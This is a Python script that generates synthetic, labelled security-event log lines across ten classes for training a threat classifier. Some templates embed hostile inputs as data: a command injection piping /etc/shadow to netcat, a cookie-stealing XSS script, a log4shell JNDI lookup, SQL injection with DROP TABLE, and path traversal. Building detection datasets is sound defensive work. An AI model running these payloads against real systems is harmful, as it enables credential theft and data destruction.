"""Synthetic cybersecurity dataset generator — from scratch, no external data.
Generates labelled defensive-security events across 10 classes with heavy
combinatorial variation (entities x templates x obfuscation x noise) so the
model learns patterns, not memorised strings. Deterministic via seed.
"""
import random

LABELS = ["benign", "malware", "phishing", "intrusion_dos", "exploit_injection",
          "credential_attack", "exfiltration", "recon_scan", "ransomware", "command_control"]

USERS = ["alice", "bob", "charlie", "admin", "svc_backup", "jdoe", "priya", "omar", "system", "deploy"]
HOSTS = ["web01", "db02", "ws-4471", "srv-prod-3", "mail01", "vpn-gw", "appserver", "filesrv"]
DOMAINS = ["example.com", "corp.local", "trusted-bank.com", "cdn-assets.net", "update-service.io"]
BAD_DOMAINS = ["evil-c2.xyz", "secure-login-verify.top", "payload-drop.ru", "free-prize-winner.click", "micros0ft-auth.net"]
FILES = ["invoice.pdf", "report.docx", "update.exe", "setup.msi", "photo.jpg", "backup.zip", "script.ps1", "lib.dll"]
PROCS = ["chrome.exe", "outlook.exe", "svchost.exe", "python.exe", "powershell.exe", "rundll32.exe", "word.exe", "bash"]
IPS = lambda r: f"{r.randint(1,223)}.{r.randint(0,255)}.{r.randint(0,255)}.{r.randint(0,255)}"
PORTS = ["22", "80", "443", "3389", "445", "8080", "53", "21", "3306", "4444", "1337"]

def _ip(r): return IPS(r)
def _hash(r): return "".join(r.choice("0123456789abcdef") for _ in range(r.choice([16, 32])))

# Each generator returns a realistic security-event string for its class.
GEN = {
 "benign": lambda r: r.choice([
   f"user {r.choice(USERS)} logged in successfully from {_ip(r)} via mfa at {r.randint(0,23)}:{r.randint(10,59)}",
   f"https GET https://{r.choice(DOMAINS)}/dashboard 200 bytes={r.randint(500,9000)} user {r.choice(USERS)}",
   f"scheduled backup completed on {r.choice(HOSTS)} files={r.randint(10,900)} status success duration {r.randint(5,120)}s",
   f"antivirus scan finished on {r.choice(HOSTS)} threats found 0 definitions up to date",
   f"user {r.choice(USERS)} downloaded {r.choice(FILES)} from https://{r.choice(DOMAINS)} signature verified",
   f"tls handshake ok host {r.choice(HOSTS)} cert valid cipher aes256 sha256 session resumed",
   f"password changed successfully for {r.choice(USERS)} policy compliant mfa enabled",
   f"software update installed on {r.choice(HOSTS)} version {r.randint(1,9)}.{r.randint(0,9)} reboot pending false",
   f"dns query {r.choice(DOMAINS)} resolved {_ip(r)} ttl 300 type A by {r.choice(HOSTS)}",
   f"file {r.choice(FILES)} uploaded to sharepoint by {r.choice(USERS)} malware scan clean sha256 {_hash(r)}"]),
 "malware": lambda r: r.choice([
   f"process {r.choice(PROCS)} spawned from temp folder sha256 {_hash(r)} known trojan signature detected",
   f"endpoint isolated {r.choice(HOSTS)} malicious binary {r.choice(FILES)} dropped by macro behavior ransomware trojan",
   f"unsigned executable {r.choice(FILES)} injected code into {r.choice(PROCS)} memory hidden process detected",
   f"file hash {_hash(r)} matched malware family emotet loader quarantined on {r.choice(HOSTS)}",
   f"suspicious process tree {r.choice(PROCS)} created autorun registry key persistence malware detected",
   f"macro in document executed shellcode downloaded payload stage2 trojan on host {r.choice(HOSTS)}",
   f"rootkit driver loaded unsigned kernel module hiding files processes on {r.choice(HOSTS)} alert",
   f"worm propagation attempt infected file share {r.choice(FILES)} copied to {r.randint(5,50)} hosts blocked"]),
 "phishing": lambda r: r.choice([
   f"email from {r.choice(BAD_DOMAINS)} urgent verify your account password expires click link login credential harvest",
   f"phishing email impersonating bank secure login at https://{r.choice(BAD_DOMAINS)}/login enter card otp now",
   f"user {r.choice(USERS)} received fake invoice email attachment {r.choice(FILES)} link to {r.choice(BAD_DOMAINS)} credential phishing",
   f"spear phishing message impersonating ceo request gift cards wire transfer urgent confidential click attachment",
   f"lookalike domain {r.choice(BAD_DOMAINS)} mimics microsoft 365 sign in page stealing passwords reported",
   f"sms smishing your package delivery failed pay fee at {r.choice(BAD_DOMAINS)} enter bank details immediately",
   f"qr code phishing email bypass gateway fake sharepoint document sign in harvest credentials {r.choice(BAD_DOMAINS)}",
   f"email spoofed hr department update payroll bank account at {r.choice(BAD_DOMAINS)} urgent action required"]),
 "intrusion_dos": lambda r: r.choice([
   f"flood {r.randint(10000,999999)} syn packets per second from {_ip(r)} to {r.choice(HOSTS)} port {r.choice(PORTS)} ddos attack",
   f"volumetric udp amplification flood saturating bandwidth {r.randint(5,95)} gbps target {r.choice(HOSTS)} service unavailable",
   f"slowloris attack many incomplete http connections exhausting server {r.choice(HOSTS)} workers denial of service",
   f"intrusion attempt exploited open port {r.choice(PORTS)} on {r.choice(HOSTS)} unauthorized shell access session opened",
   f"firewall blocked {r.randint(500,9000)} connection floods from botnet IPs targeting {r.choice(HOSTS)} dos mitigation enabled",
   f"application layer http flood {r.randint(50000,900000)} requests login endpoint {r.choice(HOSTS)} rate limit triggered outage",
   f"attacker gained foothold via unpatched service on {r.choice(HOSTS)} privilege escalation root shell intrusion confirmed",
   f"ping flood icmp echo storm from distributed bots crashing gateway {r.choice(HOSTS)} denial service alert"]),
 "exploit_injection": lambda r: r.choice([
   f"web request GET /search?q=' OR '1'='1 UNION SELECT username password FROM users sql injection attempt blocked waf",
   f"post parameter id=1; DROP TABLE users; -- sql injection payload detected source {_ip(r)}",
   f"xss payload <script>fetch stolen cookie document.cookie attacker</script> in comment field reflected cross site scripting",
   f"request path ../../../../etc/passwd directory traversal exploit attempt on {r.choice(HOSTS)} blocked",
   f"command injection input ; cat /etc/shadow | nc {_ip(r)} {r.choice(PORTS)} in ping form field exploit",
   f"log4shell jndi lookup ldap://{r.choice(BAD_DOMAINS)}/exploit in user agent header remote code execution attempt",
   f"buffer overflow exploit long payload {r.randint(500,5000)} bytes crashed service {r.choice(HOSTS)} shellcode detected",
   f"ssti payload {{{{ config }}}} template injection and ../../etc/passwd file inclusion attempt waf alert {_ip(r)}",
   f"xxe external entity file:///etc/passwd xml parser exploit and onerror img src xss payload from {_ip(r)}"]),
 "credential_attack": lambda r: r.choice([
   f"{r.randint(100,5000)} failed login attempts user {r.choice(USERS)} from {_ip(r)} in 5 minutes brute force password attack",
   f"credential stuffing attack leaked password list tried against {r.randint(200,9000)} accounts from {_ip(r)}",
   f"password spraying low slow attempts common passwords winter2024 across many users source {_ip(r)} detected",
   f"kerberoasting service ticket requests spn {r.choice(HOSTS)} rc4 hashes offline cracking credential attack",
   f"mfa fatigue push bombing {r.randint(20,90)} approval requests sent to {r.choice(USERS)} until accepted suspicious",
   f"pass the hash lateral authentication ntlm hash reuse admin account from {r.choice(HOSTS)} credential theft",
   f"hydra brute force ssh port 22 dictionary attack {r.randint(500,8000)} passwords tried user root {_ip(r)}",
   f"golden ticket forged kerberos tgt domain admin persistence credential attack detected on dc {r.choice(HOSTS)}"]),
 "exfiltration": lambda r: r.choice([
   f"large outbound transfer {r.randint(500,9000)} MB to unknown external {_ip(r)} from db server {r.choice(HOSTS)} data exfiltration",
   f"dns tunneling encoded data in subdomain queries to {r.choice(BAD_DOMAINS)} {r.randint(1000,9000)} queries exfiltrating files",
   f"user {r.choice(USERS)} uploaded confidential database dump {r.randint(100,2000)} MB to personal cloud storage unauthorized",
   f"steganography hidden data in image files sent to {r.choice(BAD_DOMAINS)} covert exfiltration channel detected dlp",
   f"ftp upload {r.randint(200,5000)} MB customer records to external server {_ip(r)} outside business hours exfiltration alert",
   f"email auto forward rule sends all mailbox data to external {r.choice(BAD_DOMAINS)} by compromised user {r.choice(USERS)}",
   f"clipboard and usb copy {r.randint(500,4000)} MB source code to removable media dlp blocked data theft exfiltration",
   f"icmp tunneling payload encoded exfiltration to {_ip(r)} bypassing proxy from {r.choice(HOSTS)} confidential data leak"]),
 "recon_scan": lambda r: r.choice([
   f"port scan {r.randint(500,65000)} ports probed on {r.choice(HOSTS)} from {_ip(r)} nmap syn scan reconnaissance",
   f"vulnerability scanner probed {r.choice(HOSTS)} checking open services banners versions from {_ip(r)} recon",
   f"directory enumeration gobuster brute forcing web paths admin login backup on https://{r.choice(HOSTS)} recon scan",
   f"dns zone transfer attempt and subdomain enumeration {r.randint(100,900)} subdomains of {r.choice(DOMAINS)} by {_ip(r)}",
   f"attacker fingerprinting os banner grabbing smtp ftp ssh services network mapping reconnaissance phase",
   f"masscan sweeping entire subnet {r.randint(2,250)}.0/24 for port {r.choice(PORTS)} hosts discovery scan detected",
   f"whois and shodan style recon querying exposed assets certificates employee emails gathering target information",
   f"smb share enumeration null session listing users groups shares on {r.choice(HOSTS)} by {_ip(r)} reconnaissance"]),
 "ransomware": lambda r: r.choice([
   f"mass file encryption {r.randint(1000,90000)} files renamed .locked ransom note readme decrypt bitcoin wallet on {r.choice(HOSTS)}",
   f"ransomware deleted shadow copies vssadmin delete shadows bcdedit recovery disabled encryption started {r.choice(HOSTS)}",
   f"ransom note pay {r.randint(1,50)} bitcoin within 72 hours files encrypted extension .cryptolocker share drives affected",
   f"double extortion ransomware exfiltrated data then encrypted servers {r.choice(HOSTS)} leak site threat publish",
   f"lockbit style ransomware process encrypting network shares rapid file rename entropy high alert {r.choice(HOSTS)}",
   f"backup files deleted and encrypted by ransomware payload ransom demand anonymous payment decrypt key hostage",
   f"esxi hypervisor hosts encrypted ransomware vm files .vmdk locked ransom note hypervisor console {r.choice(HOSTS)}",
   f"intermittent encryption ransomware partially encrypting large files speed evasion detection on {r.choice(HOSTS)}"]),
 "command_control": lambda r: r.choice([
   f"periodic beaconing every {r.randint(30,600)}s to {r.choice(BAD_DOMAINS)} small http posts jitter command and control c2",
   f"dns beaconing txt record queries c2 channel {r.choice(BAD_DOMAINS)} infected host {r.choice(HOSTS)} receiving commands",
   f"cobalt strike beacon https traffic to {r.choice(BAD_DOMAINS)} malleable profile infected {r.choice(PROCS)} process",
   f"reverse shell connection from {r.choice(HOSTS)} to {_ip(r)} port {r.choice(PORTS)} interactive command control session",
   f"domain generation algorithm dga {r.randint(50,500)} random domains queried daily malware c2 rendezvous detected",
   f"telegram and discord bot api used as command control channel compromised host polling attacker commands",
   f"https long polling encrypted c2 traffic valid tls fake cloud domain fronting beacon host {r.choice(HOSTS)}",
   f"icmp command and control replies contain shell commands infected host {r.choice(HOSTS)} beaconing {_ip(r)}"]),
}

NOISE = ["", "severity high", "severity low", "ticket auto created", "sensor ids", "region eu-west",
         "analyst review pending", f"event id pending", "source siem", "log forwarded"]

def generate(n_per_class=2200, seed=42):
    r = random.Random(seed)
    data = []
    for label in LABELS:
        for _ in range(n_per_class):
            txt = GEN[label](r)
            if r.random() < 0.35:
                txt += " " + r.choice(NOISE)
            if r.random() < 0.15:
                txt = txt.replace(" ", "  ")
            data.append((txt, LABELS.index(label)))
    r.shuffle(data)
    return data
